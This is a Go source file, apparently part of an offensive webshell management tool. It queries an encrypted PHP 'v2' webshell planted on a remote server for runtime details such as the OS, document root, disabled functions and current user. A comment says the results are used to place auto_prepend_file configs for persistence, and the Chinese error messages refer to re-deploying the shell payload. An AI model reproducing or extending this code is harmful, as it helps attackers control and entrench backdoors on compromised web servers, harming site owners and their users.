package scanner

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"strings"
)

// ShellInfo is the PHP runtime/self information reported by the v2 "I" op.
// It is used to place auto_prepend_file configs next to the actual script
// directory and to pick a mode that the current SAPI honors.
type ShellInfo struct {
	OS              string `json:"os"`
	SAPI            string `json:"sapi"`
	PHPVersion      string `json:"php"`
	File            string `json:"file"`
	Dir             string `json:"dir"`
	DocumentRoot    string `json:"document_root"`
	ScriptFilename  string `json:"script"`
	UserINIFilename string `json:"user_ini_filename"`
	UserINICacheTTL int    `json:"user_ini_cache_ttl"`
	AutoPrependFile string `json:"auto_prepend_file"`
	OpenBasedir     string `json:"open_basedir"`
	DisableFuncs    string `json:"disable_functions"`
	ServerSoftware  string `json:"server"`
	User            string `json:"user"`
	Cwd             string `json:"cwd"`
	TmpDir          string `json:"tmp"`
}

func (i ShellInfo) Windows() bool {
	return strings.HasPrefix(strings.ToUpper(strings.TrimSpace(i.OS)), "WIN")
}

// QueryShellInfo asks a PHP v2 shell for its runtime details. JSP/ASPX shells
// and older PHP payloads do not implement the I op; callers must treat the
// error as "unknown" and fall back to explicit operator input.
func QueryShellInfo(ctx context.Context, c *DeepClient, shellURL string, p ShellPayload) (ShellInfo, error) {
	if p.Protocol != ShellProtocolV2 {
		return ShellInfo{}, errors.New("只有加密 v2 webshell 支持运行时信息查询")
	}
	if !strings.EqualFold(strings.TrimSpace(p.Type), "php") {
		return ShellInfo{}, errors.New("只有 PHP webshell 支持运行时信息查询")
	}
	req, err := p.v2Request(shellURL, shellWireOp('I', nil))
	if err != nil {
		return ShellInfo{}, err
	}
	resp := c.Do(ctx, req)
	if resp.Error != "" {
		return ShellInfo{}, resp.transportErr()
	}
	if resp.StatusCode == http.StatusNotFound {
		return ShellInfo{}, errors.New("webshell 未实现信息操作（需重新投放最新 v2 PHP 载荷）")
	}
	if resp.StatusCode >= 400 {
		return ShellInfo{}, fmt.Errorf("webshell 返回 HTTP %d，信息查询被拒绝", resp.StatusCode)
	}
	out, err := decodeShellResponse(p, resp.Body)
	if err != nil {
		return ShellInfo{}, err
	}
	var info ShellInfo
	if err := json.Unmarshal([]byte(out), &info); err != nil {
		return ShellInfo{}, errors.New("webshell 返回的信息不是有效 JSON: " + err.Error())
	}
	if strings.TrimSpace(info.Dir) == "" {
		return ShellInfo{}, errors.New("webshell 信息缺少 __DIR__")
	}
	return info, nil
}
